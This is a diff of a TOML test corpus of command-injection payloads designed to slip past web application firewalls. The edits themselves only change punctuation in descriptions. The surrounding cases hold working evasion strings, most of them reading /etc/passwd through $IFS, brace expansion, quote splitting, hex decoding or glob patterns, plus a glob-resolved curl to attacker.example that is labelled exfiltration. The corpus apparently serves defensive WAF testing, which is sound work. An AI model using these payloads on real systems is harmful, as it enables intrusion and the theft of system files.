@@ -1,5 +1,5 @@
 schema = 1
-# Command injection — encoding / shell-syntax evasion variants.
+# Command injection (encoding / shell-syntax evasion variants).
 # These exploit shell's lenient lexer + Linux-specific syntaxes
 # that WAFs rarely fully implement.
 
@@ -15,13 +15,13 @@ description = "$IFS expands to shell's internal field separator;  replaces the l
 id = "ifs_substring"
 class = "cmdi"
 payload = "; cat${IFS}/etc/passwd"
-description = "${IFS} variable substitution between command and arg  — same effect as space, lexically distinct"
+description = "${IFS} variable substitution between command and arg, same effect as space, lexically distinct"
 
 [[case]]
 id = "ifs_brace_expanded"
 class = "cmdi"
 payload = "; cat${IFS%??}/etc/passwd"
-description = "Brace-expansion variant of IFS — defeats both literal-  space AND raw `$IFS` rules"
+description = "Brace-expansion variant of IFS, defeats both literal-  space AND raw `$IFS` rules"
 
 # ── Brace expansion (no space needed) ──
 
@@ -29,7 +29,7 @@ description = "Brace-expansion variant of IFS — defeats both literal-  space A
 id = "brace_expansion_cmd_arg"
 class = "cmdi"
 payload = "; {cat,/etc/passwd}"
-description = "Brace expansion as cmd+arg separator — shell parses  comma-list as space-separated tokens; WAFs don't model"
+description = "Brace expansion as cmd+arg separator, shell parses  comma-list as space-separated tokens; WAFs don't model"
 
 [[case]]
 id = "brace_expansion_curl"
@@ -43,13 +43,13 @@ description = "Same brace pattern, attacker-controlled exfil"
 id = "backslash_newline_split"
 class = "cmdi"
 payload = "; cat \\\n/etc/passwd"
-description = "Backslash-newline continuation — shell joins; WAF  line-anchored regex misses the split"
+description = "Backslash-newline continuation, shell joins; WAF  line-anchored regex misses the split"
 
 [[case]]
 id = "split_keyword_with_quote"
 class = "cmdi"
 payload = "; ca\"t\" /etc/passwd"
-description = "Quoted character in middle of keyword (`ca\"t\"` = `cat`)  — shell strips empty quotes; WAF keyword rule misses"
+description = "Quoted character in middle of keyword (`ca\"t\"` = `cat`), shell strips empty quotes; WAF keyword rule misses"
 
 [[case]]
 id = "split_keyword_with_dollar"
@@ -63,13 +63,13 @@ description = "Command substitution returns empty inside the keyword;  same idea
 id = "backtick_id"
 class = "cmdi"
 payload = "`id`"
-description = "Backtick command substitution — older shells; many WAFs  only match $(...) form"
+description = "Backtick command substitution, older shells; many WAFs  only match $(...) form"
 
 [[case]]
 id = "backtick_nested_in_string"
 class = "cmdi"
 payload = "x`id`y"
-description = "Backtick embedded in token — same expansion, harder to  detect when bookended by alnum"
+description = "Backtick embedded in token, same expansion, harder to  detect when bookended by alnum"
 
 # ── Hex/octal byte injection ──
 
@@ -83,7 +83,7 @@ description = "printf hex-decodes to `cat`; WAFs that match keywords  literally 
 id = "echo_e_hex"
 class = "cmdi"
 payload = "; $(echo -e '\\x63\\x61\\x74') /etc/passwd"
-description = "echo -e variant — different builtin, same hex decode"
+description = "echo -e variant, different builtin, same hex decode"
 
 # ── Tab character (shell whitespace) ──
 
@@ -91,7 +91,7 @@ description = "echo -e variant — different builtin, same hex decode"
 id = "tab_separator"
 class = "cmdi"
 payload = "; cat\t/etc/passwd"
-description = "Tab between command and arg — shell treats as whitespace,  space-anchored regex doesn't"
+description = "Tab between command and arg, shell treats as whitespace,  space-anchored regex doesn't"
 
 # ── Carriage-return as separator ──
 
@@ -99,7 +99,7 @@ description = "Tab between command and arg — shell treats as whitespace,  spac
 id = "cr_separator"
 class = "cmdi"
 payload = "; cat\r/etc/passwd"
-description = "Carriage return — shells like bash may accept; HTTP  strips CR but if it reaches shell, executes"
+description = "Carriage return, shells like bash may accept; HTTP  strips CR but if it reaches shell, executes"
 
 # ── Glob obfuscation ──
 
@@ -107,10 +107,10 @@ description = "Carriage return — shells like bash may accept; HTTP  strips CR 
 id = "glob_cat_path"
 class = "cmdi"
 payload = "; /???/c?? /???/p?????"
-description = "Pure-glob attack — `???` matches any 3 chars; `/bin/cat  /etc/passwd` resolves; alnum-anchored WAF rules miss"
+description = "Pure-glob attack: `???` matches any 3 chars; `/bin/cat  /etc/passwd` resolves; alnum-anchored WAF rules miss"
 
 [[case]]
 id = "glob_curl"
 class = "cmdi"
 payload = "; /???/c??l http://attacker.example/x"
-description = "Glob-resolved `curl` — exfil without spelling out the  tool name"
+description = "Glob-resolved `curl`: exfil without spelling out the  tool name"
